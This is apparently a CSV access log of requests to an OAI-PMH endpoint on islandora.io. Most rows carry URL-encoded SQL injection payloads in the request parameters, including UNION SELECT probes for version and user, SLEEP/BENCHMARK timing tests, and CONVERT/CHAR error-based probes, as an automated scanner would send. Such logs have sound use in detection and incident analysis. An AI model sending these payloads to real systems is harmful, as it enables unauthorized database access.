uuid,timestamp,http_status_code,request_url,response_time,http_version
10476292-feca-4ff5-8fb0-478581affcbc,2025-01-28 14:12:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.57 ms,HTTP/1.1
85617c9c-ecbf-4fe3-90cc-f72b25f45947,2025-01-28 14:12:51,200,http://islandora.io/oai/request?verb=ListSets,54.31 ms,HTTP/1.1
24a52456-bdbd-41b4-9903-2498d5756f52,2025-01-28 14:12:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,64.34 ms,HTTP/1.1
b3264681-f8fd-4beb-866f-616245051807,2025-01-28 14:12:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,57.17 ms,HTTP/1.1
b926dcc6-f565-40e9-af26-4e0ea894274a,2025-01-28 14:12:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&metadataPrefix=marc,64.07 ms,HTTP/1.1
7f8b3a8a-97a7-4f7d-9e83-e6c4f1fbd1d1,2025-01-28 14:12:52,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,63.27 ms,HTTP/1.1
f8350515-c38c-4e07-88c2-c00e65b439c1,2025-01-28 14:12:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats,39.26 ms,HTTP/1.1
153a6361-60ae-46ed-8ff5-628ef1f3ecd4,2025-01-28 14:12:53,200,http://islandora.io/oai/request?verb=ListSets,51.86 ms,HTTP/1.1
fa15d410-b31e-4dc2-80cd-7ae5476236a6,2025-01-28 14:12:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,76.11 ms,HTTP/1.1
a354f631-6f0d-4cc9-a72b-a7953bb73a55,2025-01-28 14:12:54,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,78.18 ms,HTTP/1.1
ed89685b-a1cf-49d0-9571-83c4fc89bb4f,2025-01-28 14:12:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&metadataPrefix=oai_dc,74.47 ms,HTTP/1.1
d7bfa4d6-f222-43ca-84fe-fc2663c218d6,2025-01-28 14:12:54,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,64.23 ms,HTTP/1.1
15188d28-d531-4555-944d-a149032b4f44,2025-01-28 14:12:55,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.48 ms,HTTP/1.1
bd7507d4-7f64-48f9-89d0-a54db7d4d989,2025-01-28 14:12:55,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,67.34 ms,HTTP/1.1
d1cc201c-b3bb-43f5-b7bf-813647dd1608,2025-01-28 14:12:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,57.32 ms,HTTP/1.1
9e15d6c7-4871-456c-a67b-5104040a0b57,2025-01-28 14:12:56,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,70.43 ms,HTTP/1.1
50411131-314d-4e42-91d5-3587ee251882,2025-01-28 14:12:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&metadataPrefix=marc,54.90 ms,HTTP/1.1
1e1edd85-3538-404d-a687-fdf85769aae4,2025-01-28 14:12:57,200,http://islandora.io/oai/request?verb=UNION+ALL+SELECT+NULL--,67.53 ms,HTTP/1.1
4610fe6d-1732-4a5b-8e3f-59ff9b858afd,2025-01-28 14:12:57,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+ALL+SELECT+NULL--,35.41 ms,HTTP/1.1
9305ac69-8ad8-429d-816d-67544457b061,2025-01-28 14:12:57,200,http://islandora.io/oai/request?verb=ListSets,55.46 ms,HTTP/1.1
6d7420a3-cfa2-4133-bedb-6663a4bcecc7,2025-01-28 14:12:58,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+NULL--&until=UNION+ALL+SELECT+NULL--&set=UNION+ALL+SELECT+NULL--,63.15 ms,HTTP/1.1
2f5b5bf1-ba4d-4e23-a31e-36e5ae708c6c,2025-01-28 14:12:58,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+ALL+SELECT+NULL--&set=UNION+ALL+SELECT+NULL--,55.41 ms,HTTP/1.1
6d59b095-56ea-4625-82b4-fd438a927dc9,2025-01-28 14:12:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+ALL+SELECT+NULL--&metadataPrefix=oai_dc,56.32 ms,HTTP/1.1
08e03f78-770e-4b37-8070-6610357750f4,2025-01-28 14:12:59,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--,61.27 ms,HTTP/1.1
320a70b1-ef73-421c-adf0-fcf0fd8dcbd2,2025-01-28 14:12:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--,55.16 ms,HTTP/1.1
bf88d86e-11d7-4a35-9d3e-0c95ab54c377,2025-01-28 14:12:59,200,http://islandora.io/oai/request?verb=ListSets,52.85 ms,HTTP/1.1
86075496-6c3b-4214-8765-f6eaab81cc85,2025-01-28 14:13:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--,64.84 ms,HTTP/1.1
4347746a-77f5-4d45-95a0-401d6cfb65ca,2025-01-28 14:13:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--,36.64 ms,HTTP/1.1
4222a147-0f6e-44f6-9a06-59ced3707a83,2025-01-28 14:13:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--&metadataPrefix=oai_dc,62.35 ms,HTTP/1.1
1baea283-e0f4-4b88-aac2-e4099fc02c18,2025-01-28 14:13:01,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--,61.94 ms,HTTP/1.1
f02fe23b-abd8-42a9-aeed-c416746754ba,2025-01-28 14:13:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.76 ms,HTTP/1.1
55f0e56d-db47-4ad1-bb92-300e8bf64b01,2025-01-28 14:13:02,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--,68.24 ms,HTTP/1.1
27081b6b-73a0-45e4-adcb-014547c3a3f9,2025-01-28 14:13:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--,70.47 ms,HTTP/1.1
89a3e43d-663a-40a3-b4ef-0ad464fb9cba,2025-01-28 14:13:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--,51.34 ms,HTTP/1.1
695322f0-4791-4d0b-a2b9-5967225c74b0,2025-01-28 14:13:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--&metadataPrefix=oai_dc,68.67 ms,HTTP/1.1
82ce9018-ce7d-49e6-a722-dcf7fcd32634,2025-01-28 14:13:03,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,67.03 ms,HTTP/1.1
46c207fd-c639-413c-89e8-7bfc6453790f,2025-01-28 14:13:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.29 ms,HTTP/1.1
a4321917-0cc6-429a-b845-cf8bdbbc9eb8,2025-01-28 14:13:04,200,http://islandora.io/oai/request?verb=ListSets,47.53 ms,HTTP/1.1
d35b4520-6bcf-47d3-aa6b-54a3f8f30e44,2025-01-28 14:13:04,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,67.37 ms,HTTP/1.1
a8a65d80-cf01-4733-8d11-55ea41d6713f,2025-01-28 14:13:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,64.44 ms,HTTP/1.1
4fd75601-104d-4393-9b95-14db0bb558b3,2025-01-28 14:13:05,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&metadataPrefix=marc,57.81 ms,HTTP/1.1
e3b6ead6-69b6-43c4-88d7-565a756881ce,2025-01-28 14:13:05,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,59.67 ms,HTTP/1.1
f8e49d13-fb07-4ef2-9d03-5aefec014777,2025-01-28 14:13:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats,32.23 ms,HTTP/1.1
f40c487f-5b2a-4ee9-95f2-013f1040c13b,2025-01-28 14:13:06,200,http://islandora.io/oai/request?verb=ListSets,31.71 ms,HTTP/1.1
2d2b1cc6-ff0c-414a-9ce5-ec1b3a360221,2025-01-28 14:13:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,39.21 ms,HTTP/1.1
4ab79606-c852-4933-89b2-ae9db1e83b84,2025-01-28 14:13:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,63.56 ms,HTTP/1.1
b58d6bac-e671-42c6-b45f-dcbbab807bc8,2025-01-28 14:13:07,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&metadataPrefix=oai_dc,52.14 ms,HTTP/1.1
f1fd2c3c-10e9-4e16-93bf-763f56e5423f,2025-01-28 14:13:07,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,44.40 ms,HTTP/1.1
2e702a63-9bd1-4d67-b154-6c237a19f266,2025-01-28 14:13:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,56.47 ms,HTTP/1.1
df643d81-9f29-4a7c-8428-0eaa40b4aafa,2025-01-28 14:13:08,200,http://islandora.io/oai/request?verb=ListSets,49.67 ms,HTTP/1.1
0aae61e8-635b-4f7c-9988-4f43ddc394e9,2025-01-28 14:13:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,63.95 ms,HTTP/1.1
90e67a78-661c-47ba-8477-5ea29efcd342,2025-01-28 14:13:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,91.71 ms,HTTP/1.1
016e26f6-2d42-4ad7-8f8e-a389e3a28e4e,2025-01-28 14:13:09,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&metadataPrefix=marc,46.19 ms,HTTP/1.1
4938c000-1bdb-49b9-8b22-a0064be50862,2025-01-28 14:13:10,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,70.18 ms,HTTP/1.1
5c2d66be-1cd9-4b2a-a515-d62d6a1543a0,2025-01-28 14:13:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,66.75 ms,HTTP/1.1
d80a14f4-c9e2-4fdb-8662-f04e56c2eed7,2025-01-28 14:13:10,200,http://islandora.io/oai/request?verb=ListSets,43.74 ms,HTTP/1.1
e92627ea-94ef-48b1-b500-8af2b526628c,2025-01-28 14:13:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,68.69 ms,HTTP/1.1
07b06b9b-a688-4b5a-bb8c-0c00d90b5a32,2025-01-28 14:13:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--,57.87 ms,HTTP/1.1
be5f4716-1484-4405-b443-113f2d7b2054,2025-01-28 14:13:11,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--&metadataPrefix=oai_dc,72.25 ms,HTTP/1.1
59ba116b-8419-47be-8dc0-a856caf4f9d4,2025-01-28 14:13:12,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--,57.65 ms,HTTP/1.1
55114084-e6ce-467d-8dc0-aab7db76079a,2025-01-28 14:13:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.21 ms,HTTP/1.1
f96cccd0-85b4-4972-a414-23c32a8461c8,2025-01-28 14:13:13,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--,68.24 ms,HTTP/1.1
07a54c68-2255-4d77-81f4-e41137539496,2025-01-28 14:13:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,79.19 ms,HTTP/1.1
dd4f5921-44a1-4ccf-b854-c9bba02739f4,2025-01-28 14:13:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--,41.61 ms,HTTP/1.1
7831ccf3-4bd6-402e-ad8b-35af03466111,2025-01-28 14:13:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--&metadataPrefix=oai_dc,48.03 ms,HTTP/1.1
c0e4b905-e908-4553-a7d6-66a37317a9b6,2025-01-28 14:13:14,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--,61.56 ms,HTTP/1.1
561bf3f0-031d-4124-a18d-d524334b942a,2025-01-28 14:13:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--,56.82 ms,HTTP/1.1
7ca5785c-7482-4025-8a4a-ad920eec8e83,2025-01-28 14:13:15,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--,56.69 ms,HTTP/1.1
464663a9-81bd-4102-996d-103e125650ca,2025-01-28 14:13:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--,86.88 ms,HTTP/1.1
64197938-149c-41d3-9a68-31c90f6d67a8,2025-01-28 14:13:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--,72.86 ms,HTTP/1.1
a63a4c19-2b8e-4e3d-af0e-f7cb5bec2a2c,2025-01-28 14:13:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--&metadataPrefix=oai_dc,62.26 ms,HTTP/1.1
57e2c548-0d54-4f34-b49a-7157cae5832a,2025-01-28 14:13:16,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29--,71.19 ms,HTTP/1.1
de6e4c4d-ecd2-417e-9eae-129cf36d3a3d,2025-01-28 14:13:17,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.68 ms,HTTP/1.1
85dffab8-48c3-429b-876f-0c2553b3df8a,2025-01-28 14:13:17,200,http://islandora.io/oai/request?verb=ListSets,46.29 ms,HTTP/1.1
